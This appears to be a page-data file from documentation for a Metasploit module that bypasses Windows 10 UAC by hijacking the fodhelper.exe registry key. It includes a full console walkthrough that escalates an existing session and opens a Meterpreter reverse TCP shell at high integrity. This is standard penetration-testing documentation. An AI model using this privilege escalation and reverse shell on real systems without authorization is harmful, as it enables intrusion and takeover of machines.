{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/bypassuac_fodhelper","result":{"data":{"moduleMetadataJson":{"id":"c01bd8f7-aadb-5108-ae10-88f65c0f4f65","name":"Windows UAC Protection Bypass (Via FodHelper Registry Key)","fullname":"exploit/windows/local/bypassuac_fodhelper","description":"This module will bypass Windows 10 UAC by hijacking a special key in the Registry under\n          the current user hive, and inserting a custom command that will get invoked when\n          the Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC\n          flag turned off.\n\n          This module modifies a registry key, but cleans up the key once the payload has\n          been invoked.\n\n          The module does not require the architecture of the payload to match the OS. If\n          specifying EXE::Custom your DLL should call ExitProcess() after starting your\n          payload in a separate process.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/bypassuac_fodhelper","documentationSlug":"/modules/documentation/exploit/windows/local/bypassuac_fodhelper"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h3>\n<p>  This module will bypass Windows 10 UAC by hijacking a special key in the Registry under\nthe current user hive, and inserting a custom command that will get invoked when\nthe Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC\nflag turned off.</p>\n<p>  This module modifies a registry key, but cleans up the key once the payload has\nbeen invoked.</p>\n<p>  The module does not require the architecture of the payload to match the OS. If\nspecifying EXE::Custom your DLL should call ExitProcess() after starting your\npayload in a separate process.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>  You'll first need to obtain a session on the target system.\nNext, once the module is loaded, one simply needs to set the <code class=\"language-text\">payload</code> and <code class=\"language-text\">session</code> options.\nThe module use an hardcoded timeout of 5 seconds during which it expects fodhelper.exe to be launched on the target system.\nOn slower system this may be too short, resulting in no session being created. In this case disable the automatic payload handler (<code class=\"language-text\">set DISABLEPAYLOADHANDLER true</code>)\nand manually create a job handler corresponding to the payload.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; \n[*] Sending stage (1189423 bytes) to 192.168.50.4\n[*] Meterpreter session 11 opened (192.168.50.1:4444 -&gt; 192.168.50.4:1654) at 2017-05-22 19:10:43 +0100\n\nmsf &gt; sessions -i 11\n[*] Starting interaction with 11...\n\nmeterpreter &gt; shell\nProcess 9496 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\sasha\\Desktop&gt;whoami /all | findstr /C:&quot;Mandatory Label&quot;\nwhoami /all | findstr /C:&quot;Mandatory Label&quot;\nMandatory Label\\Medium Mandatory Level                        Label            S-1-16-8192                                                                                     \n\nC:\\Users\\sasha\\Desktop&gt;exit\nexit\nmeterpreter &gt; \nBackground session 11? [y/N]  \nmsf &gt; use exploit/windows/local/bypassuac_fodhelper \nmsf exploit(bypassuac_fodhelper) &gt; set SESSION 11\nSESSION =&gt; 11\nmsf exploit(bypassuac_fodhelper) &gt; show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Windows x86\n   1   Windows x64\n\n\nmsf exploit(bypassuac_fodhelper) &gt; set target 0\ntarget =&gt; 0\nmsf exploit(bypassuac_fodhelper) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(bypassuac_fodhelper) &gt; run\n\n[*] Started reverse TCP handler on 192.168.50.1:4445 \n[*] UAC is Enabled, checking level...\n[+] Part of Administrators group! Continuing...\n[+] UAC is set to Default\n[+] BypassUAC can bypass this setting, continuing...\n[*] Configuring payload and stager registry keys ...\n[*] Executing payload: C:\\WINDOWS\\system32\\cmd.exe /c C:\\WINDOWS\\System32\\fodhelper.exe\n[*] Sending stage (957487 bytes) to 192.168.50.4\n[*] Meterpreter session 12 opened (192.168.50.1:4445 -&gt; 192.168.50.4:1655) at 2017-05-22 19:12:03 +0100\n[*] Cleaining up registry keys ...\n\nmeterpreter &gt; shell\nProcess 4076 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\WINDOWS\\system32&gt;whoami /all | findstr /C:&quot;Mandatory Label&quot;\nwhoami /all | findstr /C:&quot;Mandatory Label&quot;\nERROR: Unable to get user claims information.\nMandatory Label\\High Mandatory Level                          Label            S-1-16-12288                                                                                                 \n\nC:\\WINDOWS\\system32&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c01bd8f7-aadb-5108-ae10-88f65c0f4f65"}}}